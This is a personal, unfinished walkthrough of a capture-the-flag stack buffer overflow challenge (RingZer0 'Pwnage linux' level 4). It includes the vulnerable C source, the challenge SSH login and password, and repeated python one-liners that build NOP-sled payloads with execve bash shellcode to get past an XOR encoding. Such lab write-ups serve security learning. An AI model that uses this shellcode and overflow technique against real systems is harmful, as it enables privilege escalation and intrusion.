@@ -1,0 +1,190 @@
+Pwnage linux
+Challenge 4
+https://ringzer0ctf.com/challenges/102
+
+ssh -p 10080 level4@challenges.ringzer0ctf.com
+Password : VHDY2pdYVyXi08kupbos
+----------------------
+
+#include <stdlib.h>
+#include <string.h>
+#include <stdio.h>
+#include <time.h>
+#define BUFFER_MAX_SIZE 1024
+
+typedef struct __INPUT {
+        char output[BUFFER_MAX_SIZE / 4];
+} INPUT;
+
+void parse_buffer(char *buffer) {
+    srand(time(NULL));
+    char key = (unsigned char)(rand());
+    int i, size = strlen(buffer);
+    for(i = 0; i < size; i++) {
+        buffer[i] = (char)buffer[i] ^ key;
+    }
+}
+
+int main(int argc, char **argv) {
+    INPUT input;
+    char out[BUFFER_MAX_SIZE / 4];
+    char in[BUFFER_MAX_SIZE];
+    memset(out, 0, BUFFER_MAX_SIZE / 4);
+    if(argc != 2) {
+        printf("Usage: %s buffer\n", argv[0]);
+        exit(0);
+    }
+    printf("processing input\n");
+    strncpy(in, argv[1], BUFFER_MAX_SIZE - 1);
+    parse_buffer(in);
+    strncpy(out, in, BUFFER_MAX_SIZE - 1);
+    strncpy(input.output, out, BUFFER_MAX_SIZE - 1);
+    printf("output: %s\n", input.output);
+    return 0;
+}
+---------------------
+
+This one is a bit tricky, it encode our buffer to corrupt the data.
+Running the program with random input result in a segmentation fault tho.
+This is most probably the result of : 
+	strncpy(input.output, out, BUFFER_MAX_SIZE - 1);
+
+which will copy the BUFFER_MAX_SIZE / 4 characters of out in input.output but will also copy (BUFFER_MAX_SIZE - 1) - (BUFFER_MAX_SIZE / 4) zeros (padding) after input.output which will write over the return adress and result in a segmentation fault.
+
+The random generator is seeded using : srand(time(NULL))
+
+time(NULL) return the current timestamp in SECONDS from epoch (1 jan 1970).
+
+Because of the seconds resolution, we can probably write a small c program which will generate the same key (As long as it is executed in the same second). Knowing the key, we could send encoded input which will revert back to the input we want once the key is applied to it again.
+
+This was done pretty easily, see level4.c
+
+We can then call the bin like so : ./level4 `/tmp/level4 INPUT_STR`
+
+The INPUT_STR will be encoded (XOR) then passed to the ./level4 binary which will decode it (XOR again).
+
+We now need to figure out a way to change the return adress.
+
+Return adress is located at 0xffffdc7c
+
+p &out = 0xffffda78
+p &input = 0xffffdb78
+
+Return adress 0xffffdc7c is located 260 bytes after input
+
+For some reason, I can't debug correctly in gdb. When i step into the overflowing strncpy, the debugger lose track of the code.
+
+The only information I have is the segfault adress when running the program through gdb. I had to "bruteforce" the offset of the return adress. Didn't take too long :
+	r `/tmp/level4 $(python -c 'import sys;sys.stdout.write("\xcc"*4 + "\xaa"*4 + "\xbb"*255)')`
+
+	r `/tmp/level4 $(python -c 'import sys;sys.stdout.write("\xaa"*4 + "\xbb"*255 + "\x00")')`
+
+	r `./level4 $(python -c 'import sys;sys.stdout.write("\xcc"*4 + "\xaa"*4 + "\xbb"*255)')`
+
+The \xaa are at the return adress offset.
+
+Not really sure why the return adress is at offset 4 tho...
+
+The first overflow happen when strncpy(out, in). This write over the 256 bytes of the out variable, the 256 bytes of the input struct, and 512 bytes of overflow.
+
+The second overflow happen when strncpy(input.output, out). This write over the 256 bytes of input.output then 768 bytes of overflow
+
+Ok, now i understand why the first bytes are the one that override the adress.
+http://www.mathcs.emory.edu/~cheung/Courses/255/Syl-ARM/2-C-adv-data/string.html
+
+C strings are stored so that the last character have the highest memory adress (Soo, further down on the stack). Soo, when we overflow, the first bytes of the array will be the one overflowing (Further UP on the stack).
+
+Soo, now with a better understanding, we can solve this.
+There is 4 bytes between the &eip and &input.
+
+The first bytes are &input.
+Then nop slide
+Then shellcode
++ filler until 260
+
+r `/tmp/level4 $(python -c 'add="\x78\xdb\xff\xff";nb_nop=50; shellcode="\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80";import sys; sys.stdout.write("\xaa"*4 + add + "\x90"*nb_nop + shellcode + "\x00" * (257 - nb_nop - len(shellcode)))')`
+
+
+r `/tmp/level4 $(python -c 'import sys;sys.stdout.write("\xcc"*4 + "\xaa"*4 + "\xbb"*255 + "\x00" + "\xff"*759)')`
+
+
+add="\x78\xdb\xff\xff";nb_nop=50; shellcode="\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80";import sys; sys.stdout.write("\xaa"*4 + add + "\x90"*nb_nop + shellcode + "\x00" * (257 - nb_nop - len(shellcode)))
+
+
+Ok.. Now im kinda lost. This :
+	r `/tmp/level4 $(python -c 'nb_nop=50; shellcode="\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80";import sys;sys.stdout.write("\xcc"*4 + "\xaa"*4 + "\x90"*nb_nop + shellcode + "\x00" * (255 - nb_nop - len(shellcode)) + "\x0f"*759)')`
+
+Will set the return adress to \xaa
+
+But this (Filler char at the end is \x00 instead of \xf0):
+	r `/tmp/level4 $(python -c 'nb_nop=50; shellcode="\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80";import sys;sys.stdout.write("\xcc"*4 + "\xaa"*4 + "\x90"*nb_nop + shellcode + "\x00" * (255 - nb_nop - len(shellcode)) + "\x00"*759)')`
+
+Result in return adress being 0... This is kinda weird. There is something i'm not seeing here.
+
+Maybe because of the second strncpy.
+
+But heyyy, just tought of something. Since I have a \x00 after the shellcode, the parse_buffer which change the output only affect the characters before. So passing them through the /tmp/level4 script change the value of the rest of the string but it shouldnt..
+Maybe we could evade the XOR by passing a string that start with a \x00 ?
+But for the reason bellow, this might not be what we want to do :
+
+Now there is something i overlooked in strncpy. Seems like it will stop copying once it encounter a \x00 and will pad the rest of the string with zero.
+
+If this is true, bypassing the encoding won't work.
+
+This doesn't explain the weird results i'm getting by changing the value of the last character of the filler values..
+
+Might have something to do with the XOR ?? Even tho it shouldnt because of strlen.
+
+Just did some tests, when running multiple time the sample command i get different result for the return adress (Where the segfault happened).
+
+Failed with keys: x01, x68, 2f
+
+nb_nop=50; shellcode="\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80";import sys;t = "\xcc"*4 + "\xaa"*4 + "\x90"*nb_nop + shellcode + "\x00" * (255 - nb_nop - len(shellcode)) + "\x00"*759
+
+
+Sooo after some time looking around, our \x00 characters are not interpreted.
+We can test it using ./level4 $'to\x00to'. In this case the \x00 will be interpreted and the last 'to' will be ignored. This mean that we cannot evade the encoding with a null character, the characters after the \x00 is simply not copied
+
+I found a PROBLEM. when running /tmp/level4 on to preencode the string, we loose some characters.
+
+91 characters :
+	/tmp/level4 $(python -c 'nb_nop=50; shellcode="\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x6    1\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80";import sys;sys.stdout.write("\xcc"*4 + "\xaa"*4 + "\    x90"*nb_nop + shellcode + "\x00" * (255 - nb_nop - len(shellcode)) + "\x00"*759)') | wc -c
+
+1022 characters : 
+	python -c 'nb_nop=50; shellcode="\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x    2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80";import sys;sys.stdout.write("\xcc"*4 + "\xaa"*4 + "\x90"*nb_nop     + shellcode + "\x00" * (255 - nb_nop - len(shellcode)) + "\x00"*759)' | wc -c
+
+We don't have this problem with this simple case :
+
+263 characters :
+	./level4 $(python -c 'import sys;sys.stdout.write("\xcc"*4 + "\xaa"*4 + "\xbb"*255)') | wc -c
+
+263 characters :
+	python -c 'import sys;sys.stdout.write("\xcc"*4 + "\xaa"*4 + "\xbb"*255)' | wc -c
+
+This was all due to us padding with "\x00". Seems like everything after the \x00 in the python string won't be forwarded/read by /tmp/level4
+
+So this works (1022 chars):
+
+	./level4 $(python -c 'nb_nop=50; shellcode="\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x6    1\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80";import sys;sys.stdout.write("\xcc"*4 + "\xaa"*4 + "\    x90"*nb_nop + shellcode + "\xff" * (255 - nb_nop - len(shellcode)) + "\xff"*759)') | wc -c
+
+Let's try :
+	r `/tmp/level4 $(python -c 'nb_nop=50; shellcode="\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80";import sys;sys.stdout.write("\xcc"*4 + "\xaa"*4 + "\x90"*nb_nop + shellcode + "\xff" * (255 - nb_nop - len(shellcode)) + "\xff"*759)')`
+
+Seems to work. We get 0xaaaaaaaa as adress most of the time.
+
+Still can't make it jump to the correct adress with :
+	r `/tmp/level4 $(python -c 'add="\x78\xd6\xff\xff";nb_nop=50; shellcode="\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80";import sys;sys.stdout.write("\xcc"*4 + add + "\x90"*nb_nop + shellcode + "\xff" * (255 - nb_nop - len(shellcode)) + "\xff"*759)')`
+
+Still get 0xaaaaaaaa without the padding at the end :
+	r `/tmp/level4 $(python -c 'nb_nop=50; shellcode="\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80";import sys;sys.stdout.write("\xcc"*4 + "\xaa"*4 + "\x90"*nb_nop + shellcode + "\xff" * (255 - nb_nop - len(shellcode)))')`
+
+For some reason, this will jump to 0xffffda79 instead of 0xffffda78
+	r `/tmp/level4 $(python -c 'nb_nop=50; shellcode="\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80";import sys;sys.stdout.write("\xcc"*4 + "\x78\xda\xff\xff" + "\x90"*nb_nop + shellcode + "\xff" * (255 - nb_nop - len(shellcode)))')`
+
+Then if i try with 0xffffda68 to jump before and get into the nop slide (Also tried after, not working):
+	r `/tmp/level4 $(python -c 'nb_nop=50; shellcode="\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80";import sys;sys.stdout.write("\xcc"*4 + "\x68\xda\xff\xff" + "\x90"*nb_nop + shellcode + "\xff" * (255 - nb_nop - len(shellcode)))')`
+
+I get illegal instruction.. Is our shellcode wrong ? Are we jumping at the correct place.
+We jump to &input, also tried to jump to &out with no success.
+
+r `/tmp/level4 $(python -c 'nb_nop=50; shellcode="\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80";import sys;sys.stdout.write("\xcc"*4 + "\xaa"*4 + "\x90"*nb_nop + shellcode + "\xff" * (255 - nb_nop - len(shellcode)) + "\xff"*759)')`
